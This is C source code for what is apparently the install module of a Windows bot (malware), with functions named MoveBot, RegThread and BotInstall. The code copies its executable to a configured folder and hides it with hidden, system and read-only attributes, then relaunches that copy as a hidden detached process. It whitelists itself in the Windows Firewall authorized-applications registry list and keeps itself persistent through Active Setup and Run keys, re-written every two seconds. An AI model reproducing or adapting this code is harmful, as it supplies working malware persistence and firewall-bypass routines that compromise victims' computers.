#include "includes.h"
#include "externs.h"

char pending;

BOOL MoveBot(char *MTP, char *Bname)
{
	char CurrentPath[MAX_PATH],CurrentPathF[MAX_PATH],MoveToPathF[MAX_PATH];
	GetModuleFileName(GetModuleHandle(NULL),CurrentPathF,sizeof(CurrentPathF));
	_snprintf(MoveToPathF,sizeof(MoveToPathF),"%s\\%s",MTP,Bname);
	strcpy(CurrentPath,CurrentPathF);
	PathRemoveFileSpec(CurrentPath);
	char buf3[260],windir[260];
	GetWindowsDirectory(windir,sizeof(windir));
	GetModuleFileName(NULL,buf3,MAX_PATH);
	if (lstrcmpi(CurrentPathF,MoveToPathF))
	{

		if (GetFileAttributes(MoveToPathF) != DWORD(-1))
			SetFileAttributes(MoveToPathF,FILE_ATTRIBUTE_NORMAL);
		BOOL bFileCheck=FALSE;
		BOOL bCFRet=FALSE;
		while ((bCFRet=CopyFile(CurrentPathF,MoveToPathF,FALSE)) == FALSE)
		{
			DWORD result = GetLastError();
			if (!bFileCheck && (result == ERROR_SHARING_VIOLATION || result == ERROR_ACCESS_DENIED))
			{
				bFileCheck=TRUE;
				Sleep(15000);
			}
			else
				break;
		}
		SetFileAttributes(MoveToPathF,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_READONLY);
		if (bCFRet)
		{
			return TRUE;
		}
	}
	else
	{
	}
	return FALSE;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

DWORD WINAPI RegThread(LPVOID myvoid)
{
	HKEY		reg;
	char		szTemp[256], szModule[MAX_PATH], pfad[256];
    GetModuleFileName(0, szModule, sizeof(szModule));
		
    for (;;)
	{
		_snprintf(pfad, sizeof(pfad),"%s:*:Enabled:%s", szModule, cfg_regname);
		RegCreateKeyEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplications\\List", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &reg, 0);
		RegSetValueEx(reg, szModule, 0, REG_SZ, (const unsigned char *)pfad, strlen(pfad));
		RegCloseKey(reg);
	
		szTemp[0] = 0;
		strcat(szTemp, "Software\\Microsoft\\Active Setup\\Installed Components");
		strcat(szTemp, "\\");
		strcat(szTemp, "{08B0E5C0-4FCB-11CF-AAX5-00401C608512}");

		if (RegCreateKeyEx(HKEY_LOCAL_MACHINE, szTemp, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &reg, NULL) == ERROR_SUCCESS)
		{
			RegSetValueEx(reg, "StubPath", 0, REG_SZ, (const unsigned char *)szModule, lstrlen(szModule));
			RegCloseKey(reg);

			RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Active Setup\\Installed Components", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &reg, NULL);
			RegDeleteKey(reg, "{08B0E5C0-4FCB-11CF-AAX5-00401C608512}");
			RegCloseKey(reg);

			if (pending > 0)
			{
				if (pending == 2)
				{
					RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Active Setup\\Installed Components", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &reg, NULL);
					RegDeleteKey(reg, "{08B0E5C0-4FCB-11CF-AAX5-00401C608512}");
					RegCloseKey(reg);
				}
				ExitThread(0);
			}
		}
		else
		{
			RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &reg, NULL);
			RegSetValueEx(reg, cfg_regname, 0, REG_SZ, (const unsigned char *)szModule, lstrlen(szModule));
			RegCloseKey(reg);

			if (pending > 0)
			{
				if (pending == 2)
				{
					RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &reg, NULL);
					RegDeleteValue(reg, cfg_regname);
					RegCloseKey(reg);
				}
				ExitThread(0);
			}
		}

		Sleep(2000);
	}
}


/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

void BotInstall(void)
{	
	char cpbot[MAX_PATH];
	char movetopath[MAX_PATH];
	char spath[MAX_PATH];
    DWORD		id;

	GetModuleFileName(GetModuleHandle(NULL), cpbot, sizeof(cpbot));
	ExpandEnvironmentStrings(cfg_gotopth,movetopath,sizeof(movetopath));
	sprintf(spath,"%s\\%s",movetopath,cfg_filename);

	if (MoveBot(movetopath,cfg_filename))
	{
        PROCESS_INFORMATION pinfo;
		STARTUPINFO sinfo;
		ZeroMemory(&pinfo,sizeof(pinfo));
		ZeroMemory(&sinfo,sizeof(sinfo));
		sinfo.lpTitle     = "";
		sinfo.cb = sizeof(sinfo);
		sinfo.dwFlags = STARTF_USESHOWWINDOW;
		sinfo.wShowWindow = SW_HIDE;
		if (CreateProcess(spath,NULL,NULL,NULL,TRUE,NORMAL_PRIORITY_CLASS|DETACHED_PROCESS,NULL, NULL ,&sinfo,&pinfo))
		{
			Sleep(200);
			CloseHandle(pinfo.hProcess);
			CloseHandle(pinfo.hThread);
			WSACleanup();
			ExitProcess(0);
		}

	 ExitProcess(0);
    }
	
   CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RegThread, 0, 0, &id);
}
		
	
